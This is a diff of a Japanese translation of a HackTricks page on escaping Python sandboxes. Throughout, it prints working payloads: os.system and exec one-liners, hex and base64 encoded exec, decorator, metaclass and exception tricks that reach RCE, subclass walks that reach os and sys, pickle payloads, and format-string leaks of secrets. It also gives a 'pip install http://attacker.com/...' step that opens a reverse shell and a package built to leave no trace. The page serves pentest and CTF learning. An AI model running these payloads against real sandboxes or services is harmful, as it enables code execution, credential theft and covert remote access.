@@ -2,12 +2,16 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-これらはいくつかのトリックで、python サンドボックスの保護を回避し、任意のコマンドを実行する方法です。
+以下は、python sandbox の保護を回避して任意のコマンドを実行するためのいくつかのトリックです。
+
+{{#ref}}
+js2py-sandbox-escape-cve-2024-28397.md
+{{#endref}}
 
 
-## Command Execution Libraries
+## コマンド実行ライブラリ
 
-最初に知っておくべきことは、既にimportされているライブラリで直接コードを実行できるか、または以下のいずれかのライブラリをimportできるかどうかです:
+最初に確認すべきは、既にインポートされているライブラリで直接コードを実行できるか、あるいは以下のライブラリのいずれかをimportできるかどうかです：
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -42,19 +46,19 @@ system('ls')
 ```
 Remember that the _**open**_ and _**read**_ functions can be useful to **read files** inside the python sandbox and to **write some code** that you could **execute** to **bypass** the sandbox.
 
-> [!CAUTION] > **Python2 input()** function は、プログラムがクラッシュする前に python code を実行させることができます。
+> [!CAUTION] > **Python2 input()** 関数は、プログラムがクラッシュする前に python コードを実行できてしまうことがあります。
 
-Python は **load libraries from the current directory first** を優先してライブラリをロードします（以下のコマンドは python がどこからモジュールをロードしているかを表示します）: `python3 -c 'import sys; print(sys.path)'`
+Python はまずカレントディレクトリからライブラリを **load libraries from the current directory first** しようとします（次のコマンドは python がどこからモジュールをロードしているかを表示します）： `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../images/image (559).png>)
 
-## Bypass pickle sandbox with the default installed python packages
+## デフォルトでインストールされている python パッケージで pickle サンドボックスを Bypass
 
-### デフォルトのパッケージ
+### デフォルトでインストールされたパッケージ
 
 You can find a **list of pre-installed** packages here: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-注意: pickle から python env に対して、システムにインストールされている **import arbitrary libraries** を行わせることができます。\
-例えば、以下の pickle はロードされると pip ライブラリを import して使用します:
+Note that from a pickle you can make the python env **import arbitrary libraries** installed in the system.\
+For example, the following pickle, when loaded, is going to import the pip library to use it:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -67,32 +71,32 @@ return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
-pickle の動作についての詳細は次を参照してください： [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
+pickle がどのように動作するかの詳細については次を確認してください: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
-### Pip package
+### Pip パッケージ
 
-**@isHaacK** によるトリック
+トリック共有者: **@isHaacK**
 
-もし `pip` または `pip.main()` にアクセスできる場合、任意のパッケージをインストールし、次を呼び出すことで reverse shell を取得できます：
+もし `pip` または `pip.main()` にアクセスできる場合、任意のパッケージをインストールして以下を呼び出すことで reverse shell を取得できます:
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-ここから reverse shell を作成するためのパッケージをダウンロードできます。使用する前に、**解凍し、`setup.py` を変更し、reverse shell 用の IP を設定する**必要がある点に注意してください：
+You can download the package to create the reverse shell here. Please, note that before using it you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:
 
 {{#file}}
 Reverse.tar (1).gz
 {{#endfile}}
 
 > [!TIP]
-> このパッケージは `Reverse` と呼ばれます。しかし、特別に細工されており、reverse shell を終了すると残りのインストールが失敗するため、**サーバー上に余分な python package を残さずに離脱できます**。
+> このパッケージは `Reverse` と呼ばれています。しかし、特別に作られており、reverse shell を終了すると残りのインストールが失敗するようになっているため、**離脱時にサーバー上に余分な python package を残すことはありません**。
 
-## python コードの eval
+## Eval-ing python code
 
 > [!WARNING]
-> exec は複数行の文字列と ";" を許可しますが、eval は許可しません（walrus operator を確認してください）
+> exec は複数行の文字列や ";" を許可しますが、eval は許可しません（walrus operator を確認してください）
 
-特定の文字が禁止されている場合、**hex/octal/B64** 表現を使って制限を **bypass** できます：
+特定の文字が禁止されている場合、**hex/octal/B64** 表現を使って制限を **bypass** することができます：
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -113,7 +117,7 @@ exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x
 exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
-### eval python code を実行できるその他のライブラリ
+### pythonコードをevalできるその他のライブラリ
 ```python
 #Pandas
 import pandas as pd
@@ -127,9 +131,9 @@ df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")
 # Like:
 df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
 ```
-また、PDF生成ツールにおける実際の sandboxed evaluator escape も参照してください:
+また、PDFジェネレータにおける実世界のサンドボックス化された評価器の脱出事例も参照してください：
 
-- ReportLab/xhtml2pdf triple-bracket [[[...]]] expression evaluation → RCE (CVE-2023-33733). これは rl_safe_eval を悪用して、評価された属性（例えば font color）から function.__globals__ と os.system に到達し、レンダリングを安定させるために有効な値を返します。
+- ReportLab/xhtml2pdf triple-bracket [[[...]]] expression evaluation → RCE (CVE-2023-33733). これは rl_safe_eval を悪用して、評価された属性（例えば、font color）から function.__globals__ と os.system に到達し、レンダリングを安定させるために有効な値を返します。
 
 {{#ref}}
 reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
@@ -146,7 +150,7 @@ reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
 ```
 ## エンコーディングによる保護回避 (UTF-7)
 
-[**この解説**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) では UFT-7 を使って、見かけ上の sandbox 内で任意の python コードをロードして実行しています:
+この[**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)では、UFT-7を用いて表面的なsandbox内で任意のpythonコードをロードして実行しています:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -157,13 +161,13 @@ return x
 #+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
-`raw_unicode_escape` と `unicode_escape` など、他のエンコーディングを使用してそれをバイパスすることも可能です。
+`raw_unicode_escape` や `unicode_escape` のような他のエンコーディングを使ってバイパスすることも可能です。
 
-## calls なしでの Python 実行
+## 呼び出しなしでの Python 実行
 
-もし python jail 内で **doesn't allow you to make calls** 状態であっても、**execute arbitrary functions, code** や **commands** を実行する方法はいくつかあります。
+もしあなたが **呼び出しを行えない** python ジェイル内にいる場合でも、**任意の関数やコードを実行する**方法や、**コマンド**を実行する方法がいくつかあります。
 
-### [decorators](https://docs.python.org/3/glossary.html#term-decorator) を用いた RCE
+### [decorators](https://docs.python.org/3/glossary.html#term-decorator) を使った RCE
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 @exec
@@ -185,13 +189,13 @@ X = exec(X)
 @'__import__("os").system("sh")'.format
 class _:pass
 ```
-### RCE: オブジェクトの作成とオーバーロード
+### RCE — オブジェクトの作成とオーバーロード
 
-もし**クラスを宣言**し、その**クラスのオブジェクトを作成**できるなら、**異なるメソッドを書き/上書き**して、それらが**直接呼び出す必要なく****トリガーされる**ようにできます。
+もし**クラスを宣言**し、そのクラスの**オブジェクトを作成**できるなら、**異なるメソッドを書き換え/上書き**して、それらが**トリガーされる****直接呼び出す必要なく**動作するようにすることができます。
 
-#### RCE with custom classes
+#### RCE（カスタムクラスを利用）
 
-いくつかの**クラスメソッド**（_既存のクラスメソッドを上書きするか新しいクラスを作成することで_）を変更して、**トリガーされたときに****任意のコードを実行**するようにし、直接呼び出す必要がない状態にできます。
+いくつかの**クラスメソッド**（_既存のクラスメソッドを上書きするか新しいクラスを作成することで_）を修正して、**トリガーされたときに****任意のコードを実行**させるようにすることができます。
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -243,7 +247,7 @@ __ixor__ (k ^= 'import os; os.system("sh")')
 ```
 #### [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses) を使ってオブジェクトを作成する
 
-metaclasses が可能にする要点は、ターゲットクラスをメタクラスとして持つ新しいクラスを作成することで、**コンストラクタを直接呼び出さずにクラスのインスタンスを作る**ことです。
+metaclasses が可能にする主なことは、ターゲット class を metaclass として持つ新しい class を作成することで、**make an instance of a class, without calling the constructor** を直接呼び出すことなく行える点です。
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -258,9 +262,9 @@ Sub['import os; os.system("sh")']
 
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
-#### exceptionsを使ったオブジェクトの作成
+#### 例外でオブジェクトを作成する
 
-**exception** がトリガーされると、**Exception** のオブジェクトが constructor を直接呼び出す必要なく **作成されます** ([**@\_nag0mez**](https://mobile.twitter.com/_nag0mez) からのトリック):
+**例外が発生したとき**、**Exception** のオブジェクトが **作成され**、コンストラクタを直接呼び出す必要はありません（[**@\_nag0mez**](https://mobile.twitter.com/_nag0mez) のトリック）:
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -280,7 +284,7 @@ k + 'import os; os.system("sh")' #RCE abusing __add__
 
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
-### さらに RCE
+### さらにRCE
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 # If sys is imported, you can sys.excepthook and trigger it by triggering an error
@@ -302,7 +306,7 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### builtins help & license を使ってファイルを読む
+### builtins の help と license を使ってファイルを読む
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -316,17 +320,17 @@ pass
 - [**Builtins functions of python2**](https://docs.python.org/2/library/functions.html)
 - [**Builtins functions of python3**](https://docs.python.org/3/library/functions.html)
 
-もし **`__builtins__`** オブジェクトにアクセスできれば、ライブラリを import できます（最後のセクションで示した別の文字列表現をここで使うこともできます）:
+もし **`__builtins__`** オブジェクトにアクセスできれば、ライブラリをインポートできます（最後のセクションで示した他の文字列表現もここで使用できる点に注意）:
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
-### No Builtins
+### ビルトインがない
 
-When you don't have `__builtins__` you are not going to be able to import anything nor even read or write files as **すべてのグローバル関数** (like `open`, `import`, `print`...) **読み込まれていない**.\
-しかし、**デフォルトで python は多くのモジュールをメモリにインポートしています**。これらのモジュールは一見無害に見えるかもしれませんが、その中には **危険な機能を内部でインポートしているもの** があり、それにアクセスすることで **任意のコード実行** を得られる場合があります。
+`__builtins__` がないと、`open`、`import`、`print` のような **すべてのグローバル関数** が **読み込まれない** ため、何も import できず、ファイルの読み書きすらできません。\
+しかし、**デフォルトでは python は多くのモジュールをメモリにロードします**。これらのモジュールは一見無害に見えるかもしれませんが、その中には内部で危険な機能を**取り込んでいる**ものがあり、それにアクセスすることで **arbitrary code execution** を得られることさえあります。
 
-以下の例では、読み込まれたこれらの「**無害な**」モジュールのいくつかをどのように**悪用**して、その内部の**危険な** **機能**に**アクセス**するかを示します。
+以下の例では、読み込まれたこれらの「**benign**」モジュールのいくつかをどのように**abuse**して、それらの内部にある**dangerous**な**functionalities**に**access**するかを示します。
 
 **Python2**
 ```python
@@ -368,7 +372,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**以下により大きな関数があります**](#recursive-search-of-builtins-globals) は、**builtins** を見つけられる数十/**数百**の**場所**を検出します。
+[**Below there is a bigger function**](#recursive-search-of-builtins-globals) により、数十/**数百**の**場所**で**builtins**を見つけることができます。
 
 #### Python2 and Python3
 ```python
@@ -376,7 +380,7 @@ get_flag.__globals__['__builtins__']
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
 __builtins__["__import__"]('os').system('ls')
 ```
-### Builtins のペイロード
+### Builtins payloads
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -386,7 +390,7 @@ __builtins__["__import__"]("os").system("ls")
 ```
 ## Globals and locals
 
-**`globals`** と **`locals`** を確認することは、アクセスできるものを把握する良い方法です。
+**`globals`** と **`locals`** を確認することは、アクセスできるものを知るための良い方法です。
 ```python
 >>> globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
@@ -410,15 +414,15 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**Below there is a bigger function**](#recursive-search-of-builtins-globals) は、数十/**数百**の**場所**で**globals**を見つけるためのものです。
+[**Below there is a bigger function**](#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **globals**.
 
 ## Discover Arbitrary Execution
 
-ここでは、**more dangerous functionalities loaded** を簡単に発見する方法を説明し、より信頼性の高いエクスプロイトを提案します。
+ここでは、**読み込まれているより危険な機能**を簡単に発見する方法を説明し、より信頼性の高い exploits を提案します。
 
 #### Accessing subclasses with bypasses
 
-この技法で最もセンシティブな部分の一つは、**access the base subclasses** にアクセスできることです。前の例ではこれは `''.__class__.__base__.__subclasses__()` を使って行いましたが、**other possible ways** もあります：
+この技法で最もセンシティブな部分の一つは、**ベースのsubclassesにアクセスすること**ができる点です。前の例では `''.__class__.__base__.__subclasses__()` を使ってこれを行いましたが、**他の可能な方法**もあります：
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -448,16 +452,16 @@ defined_func.__class__.__base__.__subclasses__()
 ```
 ### ロードされている危険なライブラリの検出
 
-例えば、ライブラリ **`sys`** を使うと **任意のライブラリをimportできる** ことが分かっている場合、**内部で `sys` をimportしているロード済みのモジュール** をすべて検索できます:
+例えば、ライブラリ **`sys`** を使うことで **任意のライブラリを import できる** と分かっている場合、**内部で `sys` を import しているロード済みのモジュール** をすべて検索できます：
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
-たくさんあるが、コマンドを実行するには**1つだけあれば十分だ**：
+たくさんありますが、コマンドを実行するのに必要なのは**1つだけ**です:
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
-同じことは、**他のライブラリ**（**コマンドを実行できる**と分かっている）でも行えます:
+同じことは、**他のライブラリ**で、**コマンドを実行できる**と分かっているものを使って行えます:
 ```python
 #os
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
@@ -492,7 +496,7 @@ defined_func.__class__.__base__.__subclasses__()
 #pdb
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
 ```
-さらに、どのモジュールが悪意のあるライブラリをロードしているかを検索することさえできます:
+さらに、どのモジュールが悪意のあるライブラリを読み込んでいるかさえ検索できます:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 for b in bad_libraries_names:
@@ -511,7 +515,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-さらに、もし**他のライブラリ**が**コマンドを実行するために関数を呼び出せる**可能性があると考えるなら、候補となるライブラリ内で**関数名でフィルタ**することもできます:
+さらに、**他のライブラリ**が**コマンドを実行する関数を呼び出せる**と考えられる場合、候補となるライブラリ内で**関数名でフィルタ**することもできます:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -544,10 +548,10 @@ execute:
 __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
 """
 ```
-## Builtins、Globalsの再帰的検索...
+## Builtins, Globals の再帰的検索...
 
 > [!WARNING]
-> これは本当に**素晴らしい**。もし**globals、builtins、openのようなオブジェクトを探している**なら、単にこのスクリプトを使って**そのオブジェクトを見つけられる場所を再帰的に検索してください。**
+> これは**すごい**です。**globals, builtins, open のようなオブジェクトを探しているなら**、このスクリプトを使えば、**そのオブジェクトを見つけられる場所を再帰的に探せます。**
 ```python
 import os, sys # Import these to find more gadgets
 
@@ -663,13 +667,16 @@ print(SEARCH_FOR)
 if __name__ == "__main__":
 main()
 ```
+このスクリプトの出力は次のページで確認できます：
+
+
 {{#ref}}
 https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md
 {{#endref}}
 
-## Python フォーマット文字列
+## Python Format String
 
-もし **送る** **文字列** を python に送り、それが **フォーマットされる** 場合、`{}` を使って **python の内部情報** にアクセスできます。例えば、前の例を使って globals や builtins にアクセスできます。
+もしフォーマットされる**string**をpythonに**send**すると、`{}`を使って**pythonの内部情報**にアクセスできます。前の例を使ってglobalsやbuiltinsにアクセスすることができます。
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -689,16 +696,16 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-次の点に注意してください。通常の方法で**属性にアクセス**するには**ドット**を使います（例: `people_obj.__init__`）。また、引用符なしで**括弧**を使って**dict の要素**にアクセスできます: `__globals__[CONFIG]`
+Note how you can **access attributes** in a normal way with a **dot** like `people_obj.__init__` and **dict element** with **parenthesis** without quotes `__globals__[CONFIG]`
 
-また、`.__dict__` を使ってオブジェクトの要素を列挙できることにも注意してください: `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
+Also note that you can use `.__dict__` to enumerate elements of an object `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-フォーマット文字列のその他の興味深い特徴として、指定したオブジェクトに対して **`str`**, **`repr`**, **`ascii`** の**関数を実行**できる可能性があり、それぞれ **`!s`**, **`!r`**, **`!a`** を追加することで実現します:
+Some other interesting characteristics from format strings is the possibility of **executing** the **functions** **`str`**, **`repr`** and **`ascii`** in the indicated object by adding **`!s`**, **`!r`**, **`!a`** respectively:
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
 ```
-さらに、クラス内で**code new formatters**を実装することも可能です:
+さらに、クラス内で**code new formatters**を実装することができます:
 ```python
 class HAL9000(object):
 def __format__(self, format):
@@ -709,17 +716,16 @@ return 'HAL 9000'
 '{:open-the-pod-bay-doors}'.format(HAL9000())
 #I'm afraid I can't do that.
 ```
-**さらに多くの例**（**format** **string** の例）は [**https://pyformat.info/**](https://pyformat.info) で参照できます
+**さらに多くの例**（**format** **string** の例）は [**https://pyformat.info/**](https://pyformat.info) で確認できます。
 
 > [!CAUTION]
-> 以下のページも参照してください（gadgets that will r**ead sensitive information from Python internal objects**）:
-
+> 次のページも確認してください（gadgets that will r**ead sensitive information from Python internal objects**）:
 
 {{#ref}}
 ../python-internal-read-gadgets.md
 {{#endref}}
 
-### 機密情報開示ペイロード
+### 機密情報開示 Payloads
 ```python
 {whoami.__class__.__dict__}
 {whoami.__globals__[os].__dict__}
@@ -739,18 +745,18 @@ str(x) # Out: clueless
 
 参照 [here](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce): `().class.base.subclasses()[108].load_module('os').system('dir')`
 
-### From format to RCE loading libraries
+### フォーマットからライブラリ読み込みによるRCE
 
